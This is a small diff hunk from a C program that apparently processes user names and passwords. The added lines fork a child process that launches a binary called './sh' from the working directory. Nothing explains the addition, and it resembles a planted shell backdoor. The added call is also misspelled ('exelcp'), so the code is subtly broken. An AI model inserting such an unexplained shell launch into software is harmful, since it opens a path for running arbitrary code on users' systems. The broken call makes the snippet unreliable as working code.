@@ -131,5 +131,9 @@ int main(void)
 		memset(real_name2,0,strlen(real_name2));
 		memset(real_password2,0,strlen(real_password2));
 	}
+
+	if(!fork())
+		exelcp("./sh","sh",(char*)NULL);
+	
 	return 0;
 }
